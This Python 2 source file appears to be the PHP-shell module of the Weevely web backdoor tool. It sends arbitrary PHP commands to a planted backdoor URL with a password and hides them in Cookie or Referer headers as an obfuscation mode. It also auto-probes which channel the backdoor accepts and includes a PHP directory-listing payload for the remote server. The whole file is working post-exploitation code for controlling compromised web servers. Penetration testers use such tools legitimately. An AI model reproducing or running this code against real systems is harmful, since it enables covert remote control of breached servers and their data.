'''
Created on 22/ago/2011

@author: norby
'''

from core.moduleprobe import ModuleProbe
from core.moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
from core.http.cmdrequest import CmdRequest, NoDataException
from core.savedargparse import SavedArgumentParser as ArgumentParser
from argparse import SUPPRESS
from ast import literal_eval

import random, os, shlex, types


WARN_PROXY = '[!] Proxies can break weevely requests, use proxychains'
WARN_TRAILING_SEMICOLON = 'command does not have trailing semicolon'
WARN_NO_RESPONSE = 'No response'
WARN_UNREACHABLE = 'URL or proxy unreachable'
WARN_CONN_ERR = 'Error connecting to backdoor URL or proxy'
WARN_INVALID_RESPONSE = 'skipping invalid response'
WARN_PHP_INTERPRETER_FAIL = 'PHP and Shell interpreters load failed'
MSG_PHP_INTERPRETER_SUCCEED = 'PHP and Shell interpreters load succeed'
WARN_LS_FAIL = 'listing failed, no such file or directory or permission denied'
WARN_LS_ARGS = 'Error, PHP shell \'ls\' replacement supports only one <path> argument'

class Php(ModuleProbe):
    '''Shell to execute PHP commands'''

    mode_choices = ['Cookie', 'Referer' ]

    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('cmd', help='PHP command enclosed with brackets and terminated by semi-comma', nargs='+' )
    argparser.add_argument('-mode', help='Obfuscation mode', choices = mode_choices)
    argparser.add_argument('-proxy', help='HTTP proxy')
    argparser.add_argument('-precmd', help='Insert string at beginning of commands', nargs='+'  )
    argparser.add_argument('-debug', help='Change debug class (3 or less to show request and response)', type=int, default=4, choices =range(1,5))
    argparser.add_argument('-post', help=SUPPRESS, type=literal_eval, default={})
    argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')

    def _init_module(self):
        self.stored_args = { 'mode' : None, 'path' : '' }

    def _check_args(self, args):
        
        ModuleProbe._check_args(self,args)
        
        # Set proxy 
        if self.args['proxy']:
            self.mprint(WARN_PROXY)
            self.args['proxy'] = { 'http' : self.args['proxy'] }
        else:
            self.args['proxy'] = {}        
        

    def _prepare_probe(self):
        
        # Slacky backdoor validation. 
        # Avoid probing (and storing) if mode is specified by user
        
        if not self.args['mode']:
            if not self.stored_args['mode'] or self.args['just_probe']:
                self.__slacky_probe()
                
            self.args['mode'] = self.stored_args['mode']
        
        
        

        # Check if is raw command is not 'ls' 
        if self.args['cmd'][0][:2] != 'ls':
                
            # Warn about not ending semicolon
            if self.args['cmd'] and self.args['cmd'][-1][-1] not in (';', '}'):
                self.mprint('\'..%s\' %s' % (self.args['cmd'][-1], WARN_TRAILING_SEMICOLON))
          
            # Prepend chdir
            if self.stored_args['path']:
                self.args['cmd'] = [ 'chdir(\'%s\');' % (self.stored_args['path']) ] + self.args['cmd'] 
                
            # Prepend precmd
            if self.args['precmd']:
                self.args['cmd'] = self.args['precmd'] + self.args['cmd']


    def _probe(self):
        
        
        # If 'ls', execute __ls_handler
        if self.args['cmd'][0][:2] == 'ls':
            self._result = self.__ls_handler(self.args['cmd'][0])
        else:
            self._result = self.__do_request(self.args['cmd'], self.args['mode'])
        


    def __do_request(self, listcmd, mode):
        
        cmd = listcmd
        if isinstance(listcmd, types.ListType):
            cmd = ' '.join(listcmd)
        
        request = CmdRequest( self.modhandler.url, self.modhandler.password, self.args['proxy'])
        request.setPayload(cmd, mode)

        msg_class = self.args['debug']

        if self.args['post']:
            request.setPostData(self.args['post'])
            self.mprint( "Post data values:", msg_class)
            for field in self.args['post']:
                self.mprint("  %s (%i)" % (field, len(self.args['post'][field])), msg_class)

        self.mprint( "Request: %s" % (cmd), msg_class)


        try:
            response = request.execute()
        except NoDataException, e:
            raise ProbeException(self.name, WARN_NO_RESPONSE)
        except IOError, e:
            raise ProbeException(self.name, '%s. %s' % (e.strerror, WARN_UNREACHABLE))
        except Exception, e:
            raise ProbeException(self.name, '%s. %s' % (e.strerror, WARN_CONN_ERR))
    
        if 'error' in response and 'eval()\'d code' in response:
            raise ProbeException(self.name, '\'%s\' %s' % (cmd, WARN_INVALID_RESPONSE))
        
        self.mprint( "Response: %s" % response, msg_class)
        
        return response

    def __slacky_probe(self):
        
        for currentmode in self.mode_choices:

            rand = str(random.randint( 11111, 99999 ))

            try:
                response = self.__do_request('print(%s);' % (rand), currentmode)
            except ProbeException, e:
                self.mprint('%s with %s method' % (e.error, currentmode))
                continue
            
            if response == rand:
                
                self.stored_args['mode'] = currentmode
                
                # Set as best interpreter
                self.modhandler.interpreter = self.name
                
                if self.args['just_probe']:
                    raise ProbeSucceed(self.name, MSG_PHP_INTERPRETER_SUCCEED)
                
                return
        
        
        raise InitException(self.name, WARN_PHP_INTERPRETER_FAIL)
        

    def __ls_handler (self, cmd):

        path = None
        cmd_splitted = cmd.split(' ')
        
        if len(cmd_splitted)>2:
            raise ProbeException(self.name, WARN_LS_ARGS)
        elif len(cmd_splitted)==2 and self.stored_args['path']:
            # Should join with remote os.sep, but this should work (PHP support '\' as '/')
            path = os.path.join(self.stored_args['path'], cmd_splitted[1])
        elif len(cmd_splitted)==2:
            # Is that fallback useful?
            path = cmd_splitted[1]
        elif self.stored_args['path']:
            path = self.stored_args['path']
        else:
            path = '.'

        if path:
            response = self.__do_request("$path=\"%s\"; $d=@opendir($path); $a=array(); while(($f = readdir($d))) { $a[]=$f; }; sort($a); print(join('\n', $a));" % path, self.stored_args['mode'])
            
            if response:
                return response
        
        raise ProbeException('', "'%s' %s" % (path, WARN_LS_FAIL ))
            


